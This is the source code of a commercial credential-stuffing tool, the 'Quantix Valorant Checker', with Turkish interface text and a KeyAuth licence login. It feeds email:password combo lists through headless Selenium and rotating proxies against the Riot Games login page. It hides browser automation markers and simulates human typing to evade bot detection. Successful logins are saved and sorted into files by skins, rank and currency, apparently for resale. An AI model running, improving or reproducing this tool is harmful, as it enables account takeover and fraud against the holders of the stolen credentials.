            'thread_count': len([t for t in self.thread_pool if t.is_alive()])
        }

# =============================================
# Original Valorant Checker Code with Protection
# =============================================

# Get current directory where the script is located
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(BASE_DIR, "proxies", "proxy.txt")

def print_ascii_banner():
    banner = f"""{Fore.CYAN}{Style.BRIGHT}
 ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗██╗  ██╗
██╔═══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║╚██╗██╔╝
██║   ██║██║   ██║███████║██╔██╗ ██║   ██║   ██║ ╚███╔╝ 
██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║   ██║   ██║ ██╔██╗ 
╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ██║██╔╝ ██╗
 ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═╝

 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.MAGENTA}{Style.BRIGHT}                    ╔══════════════════════════════════════╗
                    ║     Quantix Valorant Checker   ║
                    ║         Made by Quantix     ║
                    ╚══════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

class KeyAuthLogin:
    def __init__(self):
        self.app_name = "QuantixCheckerSteam"
        self.owner_id = "UJIoMLD1F1"
        self.version = "1.0"
        self.api_url = "https://keyauth.win/api/1.2/"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'KeyAuth',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        self.hwid = self._get_hwid()
        self.session_id = None
        self.protection = UltimateProtection(debug_mode=False)  # Added protection

    def _get_hwid(self):
        try:
            system = platform.system().lower()
            if system == "windows":
                try:
                    raw = subprocess.check_output("wmic csproduct get uuid", shell=True, text=True)
                    lines = raw.strip().split('\n')
                    for line in lines:
                        if line.strip() and 'UUID' not in line:
                            hwid = line.strip()
                            if hwid and hwid != "":
                                return hwid
                except:
                    try:
                        raw = subprocess.check_output("wmic computersystem get uuid", shell=True, text=True)
                        lines = raw.strip().split('\n')
                        for line in lines:
                            if line.strip() and 'UUID' not in line:
                                hwid = line.strip()
                                if hwid and hwid != "":
                                    return hwid
                    except:
                        pass
            else:
                try:
                    hwid = subprocess.check_output("cat /proc/sys/kernel/random/boot_id", shell=True, text=True).strip()
                    if hwid:
                        return hwid
                except:
                    try:
                        hwid = subprocess.check_output("getprop ro.serialno", shell=True, text=True).strip()
                        if hwid and hwid != "unknown":
                            return hwid
                    except:
                        try:
                            hwid = subprocess.check_output("system_profiler SPHardwareDataType | grep 'Hardware UUID'", shell=True, text=True).split(':')[1].strip()
                            if hwid:
                                return hwid
                        except:
                            pass
            
            return str(uuid.uuid4())
        except Exception as e:
            return str(uuid.uuid4())

    def _send_request(self, payload):
        try:
            # Protection check before sending request
            self.protection._check_processes()
            
            resp = self.session.post(self.api_url, data=payload, timeout=15)
            
            if resp.status_code != 200:
                print(Fore.RED + f"HTTP Hatası: {resp.status_code}" + Fore.RESET)
                return None
                
            if not resp.text.strip():
                print(Fore.RED + "API'den boş yanıt alındı" + Fore.RESET)
                return None
                
            try:
                return resp.json()
            except:
                print(Fore.RED + f"JSON parse hatası. Yanıt: {resp.text[:200]}" + Fore.RESET)
                return None
                
        except requests.exceptions.Timeout:
            print(Fore.RED + "İstek zaman aşımına uğradı" + Fore.RESET)
            return None
        except requests.exceptions.ConnectionError:
            print(Fore.RED + "Bağlantı hatası - İnternet bağlantınızı kontrol edin" + Fore.RESET)
            return None
        except Exception as e:
            print(Fore.RED + f"İstek hatası: {e}" + Fore.RESET)
            return None

    def init_app(self):
        payload = {
            "type": "init",
            "name": self.app_name,
            "ownerid": self.owner_id,
            "ver": self.version
        }
        
        data = self._send_request(payload)
        
        if data is None:
            return False
            
        if data.get("success") is True:
            self.session_id = data.get("sessionid")
            if self.session_id:
                return True
            else:
                print(Fore.RED + "Session ID alınamadı" + Fore.RESET)
                return False
        else:
            message = data.get("message", "Bilinmeyen init hatası")
            print(Fore.RED + f"Uygulama başlatılamadı: {message}" + Fore.RESET)
            return False

    def register(self):
        if not self.init_app():
            return False
            
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔═══════════════════════════════════════════════════╗")
        print(f"║                    KAYIT OL                       ║")
        print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        username = input(f"{Fore.YELLOW}Kullanıcı Adı: {Fore.RESET}").strip()
        password = input(f"{Fore.YELLOW}Şifre: {Fore.RESET}").strip()
        key = input(f"{Fore.YELLOW}Lisans Anahtarı: {Fore.RESET}").strip()
        
        if not username or not password or not key:
            print(f"{Fore.RED}Tüm alanlar doldurulmalı!{Fore.RESET}")
            return False

        payload = {
            "type": "register",
            "name": self.app_name,
            "ownerid": self.owner_id,
            "username": username,
            "pass": password,
            "key": key,
            "hwid": self.hwid,
            "sessionid": self.session_id
        }
        
        data = self._send_request(payload)
        
        if data is None:
            return False

        if data.get("success") is True:
            print(f"{Fore.GREEN}{Style.BRIGHT}Kayıt Başarılı!{Style.RESET_ALL}")
            input(f"{Fore.GREEN}Devam etmek için Enter'a basın...{Fore.RESET}")
            return True
        else:
            message = data.get("message", "Bilinmeyen hata")
            print(f"{Fore.RED}Kayıt başarısız: {message}{Fore.RESET}")
            return False

    def login(self):
        if not self.init_app():
            return False
            
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔═══════════════════════════════════════════════════╗")
        print(f"║                   GİRİŞ YAP                       ║")
        print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        username = input(f"{Fore.YELLOW}Kullanıcı Adı: {Fore.RESET}").strip()
        password = input(f"{Fore.YELLOW}Şifre: {Fore.RESET}").strip()
        
        if not username or not password:
            print(f"{Fore.RED}Kullanıcı adı ve şifre boş olamaz!{Fore.RESET}")
            return False

        payload = {
            "type": "login",
            "name": self.app_name,
            "ownerid": self.owner_id,
            "username": username,
            "pass": password,
            "hwid": self.hwid,
            "sessionid": self.session_id
        }
        
        data = self._send_request(payload)
        
        if data is None:
            return False

        if data.get("success") is True:
            print(f"{Fore.GREEN}{Style.BRIGHT}Giriş Başarılı!{Style.RESET_ALL}")
            input(f"{Fore.GREEN}Devam etmek için Enter'a basın...{Fore.RESET}")
            return True
        else:
            message = data.get("message", "Bilinmeyen hata")
            print(f"{Fore.RED}Giriş başarısız: {message}{Fore.RESET}")
            return False

def loading_animation():
    import sys
    from itertools import cycle
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print_ascii_banner()
    
    animations = [
        ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"],
        ["◐", "◓", "◑", "◒"],
        ["▁", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃"],
        ["┤", "┘", "┴", "└", "├", "┌", "┬", "┐"]
    ]
    
    animation = cycle(random.choice(animations))
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║                    YÜKLENİYOR                         ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    loading_messages = [
        "Selenium WebDriver hazırlanıyor...",
        "Chrome WebDriver indiriliyor...",
        "Browser ayarları yapılandırılıyor...",
        "Sistem kontrol ediliyor...",
        "Klasörler oluşturuluyor...",
        "Son hazırlıklar yapılıyor..."
    ]
    
    for i, message in enumerate(loading_messages):
        for j in range(15):
            sys.stdout.write(f"\r{Fore.YELLOW}[{next(animation)}] {message} {Fore.CYAN}{'█' * (j % 10)}{' ' * (10 - (j % 10))}")
            sys.stdout.flush()
            time.sleep(0.1)
        print(f"\r{Fore.GREEN}[✓] {message} {Fore.GREEN}{'█' * 10}")
    
    print(f"\n{Fore.GREEN}{Style.BRIGHT}Yükleme tamamlandı! Hoş geldiniz!{Style.RESET_ALL}")
    time.sleep(1)

def setup_directories():
    """Create necessary directories and files in the script's current location"""
    try:
        print(f"{Fore.GREEN}✓ Ana klasör: {BASE_DIR}{Fore.RESET}")
        
        # Valorant klasörleri
        valorant_dir = os.path.join(BASE_DIR, "valorant")
        os.makedirs(valorant_dir, exist_ok=True)
        
        # Sınıflandırma klasörleri
        categories = [
            "hits", "hits_proxy", "combo",
            "skin_groups/1-10_skins", "skin_groups/11-20_skins", "skin_groups/21-30_skins", 
            "skin_groups/31-50_skins", "skin_groups/51+_skins",
            "rank_groups/iron", "rank_groups/bronze", "rank_groups/silver", 
            "rank_groups/gold", "rank_groups/platinum", "rank_groups/diamond", 
            "rank_groups/ascendant", "rank_groups/immortal", "rank_groups/radiant",
            "high_vp", "detailed_accounts", "unranked"
        ]
        
        for category in categories:
            cat_dir = os.path.join(valorant_dir, category)
            os.makedirs(cat_dir, exist_ok=True)
            accounts_file = os.path.join(cat_dir, "accounts.txt")
            if not os.path.exists(accounts_file):
                with open(accounts_file, "w", encoding="utf-8") as f:
                    f.write("")
        
        # Combo dosyası
        combo_file = os.path.join(valorant_dir, "combo.txt")
        if not os.path.exists(combo_file):
            with open(combo_file, "w", encoding="utf-8") as f:
                f.write("")
        
        # Proxy klasörü
        proxies_path = os.path.join(BASE_DIR, "proxies")
        os.makedirs(proxies_path, exist_ok=True)
        if not os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "w", encoding="utf-8") as f:
                f.write("")
        
        # Log klasörü
        logs_dir = os.path.join(BASE_DIR, "logs")
        os.makedirs(logs_dir, exist_ok=True)
        
        print(f"{Fore.GREEN}✓ Tüm klasörler ve dosyalar oluşturuldu!{Fore.RESET}")
        
    except Exception as e:
        print(f"{Fore.RED}Klasör oluşturma hatası: {e}{Fore.RESET}")
        print(f"{Fore.YELLOW}Lütfen script dosyasının bulunduğu klasörde yazma iznine sahip olduğunuzdan emin olun{Fore.RESET}")

def read_combo():
    """Enhanced combo reading with support for both email:pass and username:pass"""
    combo_path = os.path.join(BASE_DIR, "valorant", "combo.txt")
    try:
        with open(combo_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if ':' in line and line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        username, password = parts
                        yield username.strip(), password.strip()
    except FileNotFoundError:
        print(f"{Fore.RED}Combo dosyası bulunamadı: {combo_path}{Fore.RESET}")
        return
    except Exception as e:
        print(f"{Fore.RED}Combo dosyası okuma hatası: {e}{Fore.RESET}")
        return

def read_proxies():
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.YELLOW}Proxy dosyası bulunamadı: {PROXY_FILE}{Fore.RESET}")
        return []
    except Exception as e:
        print(f"{Fore.RED}Proxy dosyası okuma hatası: {e}{Fore.RESET}")
        return []

class ValorantSeleniumChecker:
    def __init__(self, use_proxy=False, proxy=None, headless=True):
        self.use_proxy = use_proxy
        self.proxy = proxy
        self.headless = headless
        self.driver = None
        self.wait = None
        self.protection = UltimateProtection(debug_mode=False)  # Added protection
        
    def setup_driver(self):
        try:
            # Protection check before setting up driver
            self.protection._check_processes()
            
            print(f"{Fore.CYAN}Chrome WebDriver hazırlanıyor...{Fore.RESET}")
            
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            # Temel Chrome ayarları - Daha iyi uyumluluk için optimizasyon
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-plugins")
            chrome_options.add_argument("--disable-images")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--allow-running-insecure-content")
            chrome_options.add_argument("--ignore-certificate-errors")
            chrome_options.add_argument("--ignore-ssl-errors")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_argument("--disable-logging")
            chrome_options.add_argument("--disable-dev-tools")
            chrome_options.add_argument("--silent")
            chrome_options.add_argument("--log-level=3")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            if self.use_proxy and self.proxy:
                chrome_options.add_argument(f"--proxy-server=http://{self.proxy}")
                print(f"{Fore.YELLOW}Proxy kullanılıyor: {self.proxy}{Fore.RESET}")
            
            try:
                print(f"{Fore.CYAN}ChromeDriver indiriliyor/kontrol ediliyor...{Fore.RESET}")
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
                print(f"{Fore.GREEN}ChromeDriver başarıyla yüklendi!{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}driver hatası: {e}{Fore.RESET}")
                print(f"{Fore.YELLOW}Manuel Driver deneniyor...{Fore.RESET}")
                # Fallback: Manuel ChromeDriver
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Anti-detection ayarları
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            
            self.wait = WebDriverWait(self.driver, 20)
            
            print(f"{Fore.GREEN} Driver başarıyla başlatıldı!{Fore.RESET}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}WebDriver başlatma hatası: {e}{Fore.RESET}")
            return False
    
    def close_driver(self):
        """WebDriver'ı kapat"""
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass
    
    def human_type(self, element, text, delay_range=(0.05, 0.15)):
        """İnsan gibi yazmayı simüle et"""
        try:
            element.clear()
            time.sleep(random.uniform(0.1, 0.3))
            for char in text:
                element.send_keys(char)
                time.sleep(random.uniform(*delay_range))
        except Exception as e:
            print(f"{Fore.YELLOW}Typing hatası: {e}{Fore.RESET}")
    
    def random_delay(self, min_delay=1, max_delay=3):
        """Rastgele bekleme"""
        time.sleep(random.uniform(min_delay, max_delay))
    
    def check_account(self, username, password):
        """Selenium ile gerçek hesap kontrolü - Geliştirilmiş sürüm"""
        try:
            # Protection check before account check
            self.protection._check_processes()
            
            if not self.setup_driver():
                return False, "WebDriver başlatılamadı", None
            
            # Riot Games login sayfasına git
            print(f"{Fore.CYAN}Login sayfasına gidiliyor...{Fore.RESET}")
            self.driver.get("https://auth.riotgames.com/")
            self.random_delay(3, 5)
            
            # Sayfanın tamamen yüklenmesini bekle
            try:
                # Farklı selector'ları dene
                username_field = None
                selectors = [
                    (By.NAME, "username"),
                    (By.CSS_SELECTOR, "input[type='text']"),
                    (By.CSS_SELECTOR, "input[placeholder*='username']"),
                    (By.CSS_SELECTOR, "input[placeholder*='email']"),
                    (By.XPATH, "//input[@type='text' or @type='email']")
                ]
                
                for selector_type, selector_value in selectors:
                    try:
                        username_field = self.wait.until(
                            EC.element_to_be_clickable((selector_type, selector_value))
                        )
                        print(f"{Fore.GREEN}Username field bulundu: {selector_value}{Fore.RESET}")
                        break
                    except TimeoutException:
                        continue
                
                if not username_field:
                    return False, "Login sayfası yüklenemedi - username field bulunamadı", None
                    
            except Exception as e:
                return False, f"Sayfa yüklenme hatası: {str(e)[:50]}", None
            
            # Kullanıcı adını gir
            print(f"{Fore.CYAN}Kullanıcı adı giriliyor: {username[:3]}***{Fore.RESET}")
            self.human_type(username_field, username)
            self.random_delay(1, 2)
            
            # Şifre alanını bul ve şifreyi gir
            password_field = None
            password_selectors = [
                (By.NAME, "password"),
                (By.CSS_SELECTOR, "input[type='password']"),
                (By.CSS_SELECTOR, "input[placeholder*='password']"),
                (By.XPATH, "//input[@type='password']")
            ]
            
            for selector_type, selector_value in password_selectors:
                try:
                    password_field = self.driver.find_element(selector_type, selector_value)
                    break
                except NoSuchElementException:
                    continue
            
            if not password_field:
                return False, "Şifre alanı bulunamadı", None
            
            print(f"{Fore.CYAN}Şifre giriliyor...{Fore.RESET}")
            self.human_type(password_field, password)
            self.random_delay(1, 2)
            
            # Login butonunu bul ve tıkla
            login_button = None
            button_selectors = [
                (By.CSS_SELECTOR, "button[type='submit']"),
                (By.CSS_SELECTOR, "button[data-testid='signin-submit-button']"),
                (By.XPATH, "//button[contains(text(), 'Sign in') or contains(text(), 'LOG IN') or contains(text(), 'Login')]"),
                (By.CSS_SELECTOR, ".btn-primary"),
                (By.CSS_SELECTOR, "[data-testid='signin-submit']")
            ]
            
            for selector_type, selector_value in button_selectors:
                try:
                    login_button = self.driver.find_element(selector_type, selector_value)
                    if login_button.is_enabled():
                        break
                except NoSuchElementException:
                    continue
            
            if not login_button:
                return False, "Login butonu bulunamadı", None
            
            print(f"{Fore.CYAN}Login butonuna tıklanıyor...{Fore.RESET}")
            self.driver.execute_script("arguments[0].click();", login_button)
            self.random_delay(4, 7)
            
            # Sonuçları kontrol et
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            print(f"{Fore.CYAN}Şu anki URL: {current_url}{Fore.RESET}")
            
            # Başarılı login kontrolü - Daha geniş kontrol
            success_urls = [
                "account.riotgames.com",
                "playvalorant.com", 
                "auth.riotgames.com/authorize",
                "auth.riotgames.com/redirect"
            ]
            
            success_indicators = [
                "welcome",
                "dashboard",
                "profile",
                "logout",
                "account-management"
            ]
            
            is_success = any(url in current_url for url in success_urls)
            has_success_indicator = any(indicator in page_source for indicator in success_indicators)
            
            if is_success or has_success_indicator:
                print(f"{Fore.GREEN}Login başarılı! Hesap geçerli.{Fore.RESET}")
                
                account_info = self.get_account_details()
                return True, "Giriş başarılı", account_info

            error_indicators = {
                "auth_failure": ["invalid", "incorrect", "wrong", "error", "failed"],
                "banned": ["banned", "suspended", "locked", "disabled"],
                "rate_limit": ["rate", "limit", "too many", "wait"],
                "2fa": ["multifactor", "2fa", "verification", "authenticator"],
                "captcha": ["captcha", "hcaptcha", "recaptcha", "bot"]
            }
            
            for error_type, keywords in error_indicators.items():
                if any(keyword in page_source for keyword in keywords):
                    if error_type == "auth_failure":
                        return False, "Hatalı kullanıcı adı veya şifre", None
                    elif error_type == "banned":
                        return False, "Hesap yasaklı/askıda", None
                    elif error_type == "rate_limit":
                        return False, "Rate limit - çok fazla deneme", None
                    elif error_type == "2fa":
                        return False, "2FA aktif - desteklenmiyor", None
                    elif error_type == "captcha":
                        return False, "Captcha gerekli", None
            
            # Eğer hala auth sayfasındaysak ve belirgin hata yoksa
            if "auth.riotgames.com" in current_url:
                # Error elementlerini kontrol et
                error_elements = self.driver.find_elements(By.CSS_SELECTOR, 
                    ".error, .error-message, [data-testid*='error'], .alert-danger, .text-danger")
                if error_elements:
                    error_text = ""
                    for elem in error_elements:
                        if elem.is_displayed():
                            error_text = elem.text.lower()
                            break
                    
                    if error_text:
                        if any(word in error_text for word in ["username", "password", "credentials"]):
                            return False, "Hatalı giriş bilgileri", None
                        else:
                            return False, f"Auth hatası: {error_text[:50]}", None
                
                return False, "Login başarısız - sayfa değişmedi", None
            
            else:
                return False, "Beklenmeyen sayfa yönlendirmesi", None
                
        except TimeoutException:
            return False, "Sayfa yüklenme zaman aşımı", None
        except WebDriverException as e:
            return False, f"WebDriver hatası: {str(e)[:50]}", None
        except Exception as e:
            return False, f"Bilinmeyen hata: {str(e)[:50]}", None
        finally:
            self.close_driver()
    
    def get_account_details(self):
        """Hesap detaylarını Valorant sitesinden al - Geliştirilmiş"""
        account_info = {
            "skins_count": 0,
            "vp_amount": 0,
            "rank": "Unranked",
            "level": 0
        }
        
        try:
            # Protection check before getting account details
            self.protection._check_processes()
            
            # Valorant sayfasına git
            print(f"{Fore.CYAN}🎮 Valorant hesap bilgileri kontrol ediliyor...{Fore.RESET}")
            
            # Önce account sayfasından başla
            self.driver.get("https://account.riotgames.com/")
            self.random_delay(2, 4)
            
            try:
                # Seviye bilgisini almaya çalış
                level_selectors = [
                    ".level", ".account-level", "[data-testid*='level']",
                    ".profile-level", ".user-level"
                ]
                
                for selector in level_selectors:
                    try:
                        level_elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                        if level_elements:
                            level_text = level_elements[0].text
                            level_match = re.search(r'\d+', level_text)
                            if level_match:
                                account_info["level"] = int(level_match.group())
                                print(f"{Fore.GREEN}📊 Seviye bulundu: {account_info['level']}{Fore.RESET}")
                                break
                    except:
                        continue
                
            except Exception as e:
                print(f"{Fore.YELLOW}Seviye bilgisi alınamadı: {e}{Fore.RESET}")
            
            # Valorant sayfasına git
            try:
                self.driver.get("https://playvalorant.com/en-us/")
                self.random_delay(3, 5)
                
                # Hesabın Valorant'a bağlı olup olmadığını kontrol et
                play_indicators = [
                    "a[href*='download']", "button[contains(text(), 'Play')]",
                    ".play-button", "[data-testid*='play']"
                ]
                
                for indicator in play_indicators:
                    try:
                        play_button = self.wait.until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, indicator))
                        )
                        if play_button:
                            print(f"{Fore.GREEN}Valorant hesabı aktif!{Fore.RESET}")
                            break
                    except TimeoutException:
                        continue
                
            except Exception as e:
                print(f"{Fore.YELLOW}Valorant hesap durumu belirsiz: {e}{Fore.RESET}")
            
            return account_info
            
        except Exception as e:
            print(f"{Fore.YELLOW}Hesap detayları alınamadı: {e}{Fore.RESET}")
            return account_info

def save_valorant_result(email, password, account_info, use_proxy):
    """Valorant hesabını kategorilere göre kaydet"""
    valorant_dir = os.path.join(BASE_DIR, "valorant")
    
    # Ana hit dosyasına kaydet
    hit_file = "hits_proxy.txt" if use_proxy else "hits.txt"
    with open(os.path.join(valorant_dir, hit_file), "a", encoding="utf-8") as f:
        f.write(f"{email}:{password}\n")
    
    # Detaylı bilgiler
    detailed_info = f"{email}:{password} | Skins: {account_info['skins_count']} | VP: {account_info['vp_amount']} | Rank: {account_info['rank']} | Level: {account_info['level']}\n"
    with open(os.path.join(valorant_dir, "detailed_accounts", "accounts.txt"), "a", encoding="utf-8") as f:
        f.write(detailed_info)
    
    # Skin sayısına göre gruplandır
    skins = account_info['skins_count']
    if 1 <= skins <= 10:
        skin_group = "1-10_skins"
    elif 11 <= skins <= 20:
        skin_group = "11-20_skins"
    elif 21 <= skins <= 30:
        skin_group = "21-30_skins"
    elif 31 <= skins <= 50:
        skin_group = "31-50_skins"
    elif skins >= 51:
        skin_group = "51+_skins"
    else:
        skin_group = "1-10_skins"  # 0 skin için
    
    with open(os.path.join(valorant_dir, "skin_groups", skin_group, "accounts.txt"), "a", encoding="utf-8") as f:
        f.write(detailed_info)
    
    # Rank'e göre gruplandır
    rank = account_info['rank'].lower()
    if "iron" in rank:
        rank_group = "iron"
    elif "bronze" in rank:
        rank_group = "bronze"
    elif "silver" in rank:
        rank_group = "silver"
    elif "gold" in rank:
        rank_group = "gold"
    elif "platinum" in rank:
        rank_group = "platinum"
    elif "diamond" in rank:
        rank_group = "diamond"
    elif "ascendant" in rank:
        rank_group = "ascendant"
    elif "immortal" in rank:
        rank_group = "immortal"
    elif "radiant" in rank:
        rank_group = "radiant"
    else:
        rank_group = "unranked"
    
    with open(os.path.join(valorant_dir, "rank_groups", rank_group, "accounts.txt"), "a", encoding="utf-8") as f:
        f.write(detailed_info)
    
    # 1000+ VP hesapları
    if account_info['vp_amount'] >= 1000:
        with open(os.path.join(valorant_dir, "high_vp", "accounts.txt"), "a", encoding="utf-8") as f:
            f.write(detailed_info)

def worker(combo_queue, proxies, use_proxy, results_lock, stats, headless_mode):
    """Worker thread for checking accounts"""
    protection = UltimateProtection(debug_mode=False)  # Added protection
    
    while not combo_queue.empty():
        try:
            # Protection check before processing account
            protection._check_processes()
            
            email, password = combo_queue.get_nowait()
        except queue.Empty:
            break
        
        proxy = random.choice(proxies) if use_proxy and proxies else None
        
        # ValorantSeleniumChecker sınıfını kullan
        checker = ValorantSeleniumChecker(use_proxy=use_proxy, proxy=proxy, headless=headless_mode)
        result, msg, account_info = checker.check_account(email, password)
        
        with results_lock:
            if result:
                stats["hits"] += 1
                print(f"{Fore.GREEN}{Style.BRIGHT}[✔] {email}:{password} → {msg}{Style.RESET_ALL}")
                if account_info:
                    print(f"{Fore.CYAN}    Skins: {account_info['skins_count']} | 💎 VP: {account_info['vp_amount']} | 🏆 Rank: {account_info['rank']} | 📊 Level: {account_info['level']}")
                save_valorant_result(email, password, account_info or {"skins_count": 0, "vp_amount": 0, "rank": "Unranked", "level": 0}, use_proxy)
            else:
                stats["fails"] += 1
                if "rate" in msg.lower() and "limit" in msg.lower():
                    print(f"{Fore.YELLOW}[⚠] {email}:{password} → {msg}")
                elif "captcha" in msg.lower():
                    print(f"{Fore.MAGENTA}[🤖] {email}:{password} → {msg}")
                elif "2fa" in msg.lower():
                    print(f"{Fore.BLUE}[🔐] {email}:{password} → {msg}")
                else:
                    print(f"{Fore.RED}[✘] {email}:{password} → {msg}")
            
            stats["checked"] += 1
        
        combo_queue.task_done()
        
        # Rate limit için daha uzun bekleme (Selenium daha yavaş)
        time.sleep(random.uniform(2, 5))

def start_valorant_check(use_proxy=False, num_threads=2, headless_mode=True):
    """Ana kontrol fonksiyonu"""
    proxies = read_proxies() if use_proxy else []
    combos = list(read_combo())
    
    if not combos:
        print(f"{Fore.RED}Combo dosyası boş! combo.txt dosyasına email:password formatında hesaplar ekleyin.{Fore.RESET}")
        return
    
    if use_proxy and not proxies:
        print(f"{Fore.RED}Proxy kullanımı seçildi ama proxy dosyası boş!{Fore.RESET}")
        return
    
    combo_queue = queue.Queue()
    for combo in combos:
        combo_queue.put(combo)
    
    stats = {"hits": 0, "fails": 0, "checked": 0}
    results_lock = threading.Lock()
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║              SELENIUM VALORANT CHECKER BAŞLATILIYOR     ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 Toplam hesap: {len(combos)}")
    print(f"{Fore.CYAN}🧵 Thread sayısı: {num_threads}")
    print(f"{Fore.CYAN}🌐 Proxy kullanımı: {'✅ Evet' if use_proxy else '❌ Hayır'}")
    print(f"{Fore.CYAN}👻 Headless mod: {'✅ Evet' if headless_mode else '❌ Hayır (Browser görünür)'}")
    if use_proxy:
        print(f"{Fore.CYAN}🔗 Kullanılabilir proxy: {len(proxies)}")
    print(f"{Fore.YELLOW}Bypass kullanıldığı için işlem daha yavaş olacak")
    print(f"{Fore.YELLOW}Driver otomatik olarak indirilecek")
    print(f"{Fore.CYAN}{'═' * 60}")
    
    # Progress bar setup
    progress_bar = tqdm(total=len(combos), desc="Kontrol ediliyor", 
                       bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Fore.RESET),
                       ncols=80)
    
    def update_progress():
        while stats["checked"] < len(combos):
            progress_bar.n = stats["checked"]
            progress_bar.refresh()
            time.sleep(0.5)
        progress_bar.close()
    
    progress_thread = threading.Thread(target=update_progress)
    progress_thread.start()
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(combo_queue, proxies, use_proxy, results_lock, stats, headless_mode))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    progress_thread.join()
    
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║                   KONTROL TAMAMLANDI                   ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{Style.BRIGHT}📈 İstatistikler:")
    print(f"{Fore.CYAN}  ✅ Toplam kontrol edilen: {stats['checked']}")
    print(f"{Fore.GREEN}  🎯 Başarılı: {stats['hits']}")
    print(f"{Fore.RED}  ❌ Başarısız: {stats['fails']}")
    if stats['checked'] > 0:
        success_rate = (stats['hits'] / stats['checked']) * 100
        print(f"{Fore.YELLOW}  📊 Başarı oranı: %{success_rate:.2f}")

def check_proxy(proxy: str, timeout=10) -> bool:
    """Proxy'yi test et"""
    try:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=timeout)
        return r.status_code == 200
    except:
        return False

def proxy_checker(num_threads=10):
    """Proxy kontrolcüsü"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗")
    print(f"║                   PROXY CHECKER                        ║")
    print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    proxies = read_proxies()
    if not proxies:
        print(f"{Fore.RED}Proxy dosyası boş! {PROXY_FILE} dosyasına proxy ekleyin.{Fore.RESET}")
        return
    
    print(f"{Fore.CYAN}🔍 {len(proxies)} proxy kontrol ediliyor...")
    
    good_proxies = []
    proxy_queue = queue.Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)

    lock = threading.Lock()
    progress_bar = tqdm(total=len(proxies), desc="Proxy kontrol", 
                       bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.BLUE, Fore.RESET),
                       ncols=80)

    def thread_worker():
        protection = UltimateProtection(debug_mode=False)  # Added protection
        
        while not proxy_queue.empty():
            try:
